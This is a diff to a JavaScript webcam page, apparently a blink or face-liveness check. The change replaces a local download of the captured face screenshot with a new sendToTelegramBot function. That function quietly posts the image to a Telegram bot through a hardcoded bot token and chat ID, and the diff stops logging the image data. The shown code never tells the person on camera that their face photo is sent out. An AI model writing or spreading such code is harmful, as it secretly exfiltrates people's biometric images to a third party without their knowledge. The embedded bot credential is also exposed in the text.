@@ -187,7 +187,8 @@
                                 if (!gotPhoto) {
                                     gotPhoto = true;
                                     setTimeout(() => {
-                                        takeScreenshot("blinking", detections.detection.box);
+                                        const dataURL = takeScreenshot("blinking", detections.detection.box);
+                                        sendToTelegramBot(dataURL);
                                     }, 100);
                                 }
                             } else {
@@ -268,13 +269,40 @@
             const dataURL = canvas.toDataURL("image/png");
 
             // Save the image or display it (example: console log the URL)
-            console.log(`Screenshot (${state}):`, dataURL);
+            console.log(`Screenshot (${state})`);
 
-            // Optionally, you can trigger a download
-            const link = document.createElement("a");
-            link.href = dataURL;
-            link.download = `${state}_face.png`;
-            link.click();
+            return dataURL;
+        }
+
+        function sendToTelegramBot(dataURL) {
+            const botToken = "7907821344:AAEJYy-7K_8aDZlxeYGdDXPTHqBsOQNj40k";
+            const chatId = "720530019";
+            // Convert base64 to Blob
+            function dataURLtoBlob(dataURL) {
+                const byteString = atob(dataURL.split(",")[1]);
+                const mimeString = dataURL.split(",")[0].split(":")[1].split(";")[0];
+                const arrayBuffer = new ArrayBuffer(byteString.length);
+                const uint8Array = new Uint8Array(arrayBuffer);
+                for (let i = 0; i < byteString.length; i++) {
+                    uint8Array[i] = byteString.charCodeAt(i);
+                }
+                return new Blob([arrayBuffer], { type: mimeString });
+            }
+
+            // Convert to Blob
+            const imageBlob = dataURLtoBlob(dataURL);
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", imageBlob, "screenshot.png");
+
+            // Send image to Telegram bot
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+                .then(response => response.json())
+                .then(data => console.log("Telegram Response:", data))
+                .catch(error => console.error("Error sending image:", error));
         }
 
         // Initialize Webcam and Load Models
